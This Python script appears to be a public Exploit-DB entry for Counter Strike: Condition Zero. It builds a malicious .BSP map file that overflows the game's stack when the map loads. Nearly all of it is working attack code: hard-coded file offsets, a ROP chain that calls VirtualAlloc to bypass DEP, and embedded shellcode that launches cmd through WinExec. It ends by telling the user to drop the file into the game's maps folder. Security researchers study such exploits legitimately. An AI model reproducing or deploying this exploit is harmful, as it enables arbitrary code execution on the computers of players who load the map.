#!/usr/bin/env python
# Counter Strike: Condition Zero BSP map exploit
#  By @Digital_Cold Jun 11, 2017
#
# E-DB Note: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42325.zip (bsp-exploit-source.zip)
# 
from binascii import hexlify, unhexlify
from struct import pack, unpack
import math
import mmap
import logging

fmt = "[+] %(message)s"

logging.basicConfig(level=logging.INFO, format=fmt)
l = logging.getLogger("exploit")

# Specific to the file
INDEX_BUFFER_OFF = 0x92ee0          # ARRAY[int]
VERTEX_BUFFER_INDEXES_OFF = 0xA9174 # ARRAY[unsigned short]
VERTEX_DATA_OFF = 0x37f7c           # ARRAY[VEC3], VEC3[float, float, float]
NUM_EDGES_OFF = 0x70f94             # The length that was fuzzed to cause the crash

# No longer used as could not find a gadget to 'pop, pop, pop esp, ret'
# SEH_OVERWRITE_OFF = 0x4126C

# Initial offset into the index buffer where the function to exploit resides
INITIAL_OFFSET = 0xb130 # this is multiplied by 4 for data type size already

# INDEX_BUFFER
# 0: 20
# 1: 10
# 2: 2 --> Vertex Buffer Indexes

# VERTEX BUFFER INDEXES
# 0: 1
# 1: 2
# 2: 4 --> Vertex Data

# VERTEX DATA
# 0: 1.23, 23423.0, 3453.3
# 1: 1.23, -9.0, 3453.3
# 2: 1.0, 1.0, 1.0
# 3: 1.0, 1.0, 1.0
# 4: 0.0, 1.0, 0.0

# Example:
# a = INDEX_BUFFER[2] ; a = 2
# b = VERTEX_BUFFER[a] ; b = 4
# vec = VERTEX_DATA[b] ; vec = 0.0, 1.0, 0.0

def dw(x):
  return pack("I", x)

def main():
  target_file = "eip-minimized.bsp"
  output_file = "exploit-gen.bsp"

  print "GoldSource .BSP file corruptor"
  print "  by @Digital_Cold"
  print

  l.info("Corrupting target file %s" % target_file)

  # Read in and memory map target file
  fp = open(target_file, 'rb')
  mmfile = mmap.mmap(fp.fileno(), 0, access = mmap.ACCESS_READ | mmap.ACCESS_COPY)
  fp.close()

  VEC3_COUNT = 63
  # then come Saved EBP and return address

  start_idx = INDEX_BUFFER_OFF + INITIAL_OFFSET
  second_idx = VERTEX_BUFFER_INDEXES_OFF
  vertex_data_start = VERTEX_DATA_OFF + 12*0x1000 # arbitrary offset, lower causes faults

  l.info("Writing to index buffer offset %08x...", start_idx)
  l.info("Vertex buffer indexes start %08x", second_idx)
  l.info("Vertex data at %08x", vertex_data_start)

  data_buffer = []

  for i in range(VEC3_COUNT):
    for j in range(3):
      data_buffer.append(str(chr(0x41+i)*4)) # easy to see pattern in memory

  data_buffer.append("\x00\x00\x00\x00") # dont care
  data_buffer.append("\x00\x00\x00\x00") # unk1
  data_buffer.append("\x00\x00\x00\x00") # unk2

  data_buffer.append("\x00\x00\x00\x00") # numVerts (needs to be zero to skip tail call)
  data_buffer.append("\x00\x00\x00\x00") # EBP
  data_buffer.append(dw(0x01407316))     # Saved Ret --> POP EBP; RET [hl.exe]

  # XXX: bug in mona. This is a ptr to VirtualProtectEx!!
  #   0x387e01ec,  # ptr to &VirtualProtect() [IAT steamclient.dll]

  """
   Register setup for VirtualAlloc() :
   --------------------------------------------
    EAX = NOP (0x90909090)
    ECX = flProtect (0x40)
    EDX = flAllocationType (0x1000)
    EBX = dwSize
    ESP = lpAddress (automatic)
    EBP = ReturnTo (ptr to jmp esp)
    ESI = ptr to VirtualAlloc()
    EDI = ROP NOP (RETN)
    --- alternative chain ---
    EAX = ptr to &VirtualAlloc()
    ECX = flProtect (0x40)
    EDX = flAllocationType (0x1000)
    EBX = dwSize
    ESP = lpAddress (automatic)
    EBP = POP (skip 4 bytes)
    ESI = ptr to JMP [EAX]
    EDI = ROP NOP (RETN)
    + place ptr to "jmp esp" on stack, below PUSHAD
   --------------------------------------------
  """

  # START ROP CHAIN
  # DEP disable ROP chain
  # rop chain generated with mona.py - www.corelan.be
  #
  # useful for finding INT3 gadget - !mona find -s ccc3 -type bin -m hl,steamclient,filesystem_stdio
  rop_gadgets = [
    #0x3808A308,  # INT3 # RETN [steamclient.dll]
    0x38420ade,  # POP EDX # RETN [steamclient.dll]
    0x387e01e8,  # ptr to &VirtualAlloc() [IAT steamclient.dll]
    0x381236c5,  # MOV ESI,DWORD PTR DS:[EDX] # ADD DH,DH # RETN [steamclient.dll]
    0x381ebdc1,  # POP EBP # RETN [steamclient.dll]
    0x381f98cd,  # & jmp esp [steamclient.dll]
    0x387885ac,  # POP EBX # RETN [steamclient.dll]
    0x00000001,  # 0x00000001-> ebx
    0x384251c9,  # POP EDX # RETN [steamclient.dll]
    0x00001000,  # 0x00001000-> edx
    0x387cd449,  # POP ECX # RETN [steamclient.dll]
    0x00000040,  # 0x00000040-> ecx
    0x386c57fe,  # POP EDI # RETN [steamclient.dll]
    0x385ca688,  # RETN (ROP NOP) [steamclient.dll]
    0x0140b00e,  # POP EAX # RETN [hl.exe]
    0x90909090,  # nop
    0x385c0d3e,  # PUSHAD # RETN [steamclient.dll]
  ]


  # Can be replaced with ANY shellcode desired...
  # http://shell-storm.org/shellcode/files/shellcode-662.php
  shellcode = "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B" + \
    "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9" + \
    "\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C" + \
    "\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0" + \
    "\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B" + \
    "\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72" + \
    "\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03" + \
    "\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47" + \
    "\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F" + \
    "\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72" + \
    "\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66" + \
    "\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14" + \
    "\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE" + \
    "\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53" + \
    "\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24" + \
    "\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51" + \
    "\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE" + \
    "\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45" + \
    "\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54" + \
    "\x24\x20\x57\xFF\xD0"

  shellcode += "\xeb\xfe" # infinite loop! (we dont want hl.exe to crash)
  shellcode += "\xeb\xfe"
  shellcode += "\xeb\xfe"
  shellcode += "\xeb\xfe"
  shellcode += "\xeb\xfe"

  shellcode_dwords = int(math.ceil(len(shellcode)/4.0))
  extra_dwords = int(math.ceil((len(rop_gadgets)+shellcode_dwords)/3.0))

  # Loop count (needs to be the exact amount of ROP we want to write
  data_buffer.append(dw(extra_dwords))

  for addr in rop_gadgets:
    data_buffer.append(dw(addr))

  for b in range(shellcode_dwords):
    data = ""

    for byte in range(4):
      idx = byte + b*4

      # pad to nearest DWORD with INT3
      if idx >= len(shellcode):
        data += "\xcc"
      else:
        data += shellcode[idx]

    data_buffer.append(data)

  second_idx += 8000*4 # time 4 because we skip every-other WORD, which means each index has 4 bytes

  # 8000 is arbitrary, but it doesn't cause the map load to exit with a FATAL before
  # we can exploit the function

  # UNCOMMENT TO CHANGE INITIAL SIZE OF OVERFLOW
  #mmfile[NUM_EDGES_OFF] = pack("B", 0x41)

  for i in range(int(math.ceil(len(data_buffer)/3.0))):
    mmfile[start_idx+4*i:start_idx+4*(i+1)] = pack("I", 8000+i)
    mmfile[second_idx+2*i:second_idx+2*(i+1)] = pack("H", 0x1000+i)

    second_idx += 2 # required because the game loads every-other word

    # This data will now be on the stack
    for j in range(3):
      sub_idx = j*4 + i*0xc
      data_idx = i*3 + j
      towrite = ""

      if data_idx >= len(data_buffer):
        towrite = "\x00"*4
      else:
        towrite = data_buffer[i*3 + j]

      mmfile[vertex_data_start+sub_idx:vertex_data_start+sub_idx+4] = towrite
      #l.debug("Write[%08x] --> offset %d" % (unpack("I", towrite)[0], vertex_data_start+sub_idx))

  # write out the corrupted file
  outfile = open(output_file, "wb")
  outfile.write(mmfile)
  outfile.close()

  l.info("Wrote %d byte exploit file to %s" % (len(mmfile), output_file))
  l.info("Copy to game maps/ directory!")

if __name__ == "__main__":
  main()